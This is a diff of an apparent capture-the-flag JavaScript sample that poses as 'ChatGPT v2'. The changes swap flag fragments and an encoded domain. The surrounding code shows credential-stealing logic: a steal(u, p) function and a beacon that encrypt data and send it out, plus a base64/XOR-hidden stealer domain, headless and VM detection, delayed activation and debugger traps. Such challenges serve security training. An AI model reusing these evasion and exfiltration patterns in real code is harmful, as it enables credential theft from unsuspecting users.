@@ -2,7 +2,7 @@ console.log('flag{th1s_');
 
 (function() {
     // 🔒 Stage 1: Target Site Detection (Base64 + XOR fake check)
-    const encoded = "c3RlYWxlci5jeWJlcnN1cmFrc2hhLmNv";
+    const encoded = "c3RlYWxlci5jeWJlcnN1cmtzaGEuY28="; 
     const xorDecode = (str, key) => str.split('').map((c,i)=>String.fromCharCode(c.charCodeAt(0)^key.charCodeAt(i%key.length))).join('');
     const target = xorDecode(atob(encoded), 'XrKey');
 
@@ -10,7 +10,7 @@ console.log('flag{th1s_');
 
     // 🎭 Stage 2:  Interface + Session Trigger
     const sessionFlag = localStorage.getItem('gpt_session') || 0;
-    localStorage.setItem('sessionKey', '1s_mult1'); 
+    localStorage.setItem('sessionKey', '1s_not'); 
 if (sessionFlag < 2) {
         console.log("Welcome to ChatGPT v2!");
         localStorage.setItem('gpt_session', parseInt(sessionFlag) + 1);
@@ -20,7 +20,7 @@ if (sessionFlag < 2) {
     // ⏱ Stage 3: Delayed Activation & Anti-Sandbox
     const delay = Math.floor(Math.random() * 3000) + 2000;
     const ua = window.navigator.userAgent.toLowerCase();
-    document.cookie = 'auth=stage_ct'; 
+    document.cookie = 'auth=easy'; 
 if (ua.includes('headless') || ua.includes('vmware') || window.outerWidth < 400) return;
 
     setTimeout(() => {
@@ -53,7 +53,7 @@ function steal(u, p) {
         send(encrypt(JSON.stringify(payload)));
     }
 
-    var hiddenFlag = 'ng3_fin4'; 
+    var hiddenFlag = 'ng3_2'; 
 function beacon(t, d) {
         let payload = { type: t, data: d, site: location.hostname };
         send(encrypt(JSON.stringify(payload)));
@@ -80,7 +80,7 @@ function beacon(t, d) {
             throw new Error("Debugger Detected");
         }
     });
-    Object.defineProperty(window, 'final_flag_part', { get: function() { return 'l_f1nd_m3}'; } }); 
+    Object.defineProperty(window, 'final_flag_part', { get: function() { return 'solve'; } }); 
 console.log(el);
     setInterval(() => {
         const s = new Date(); debugger;
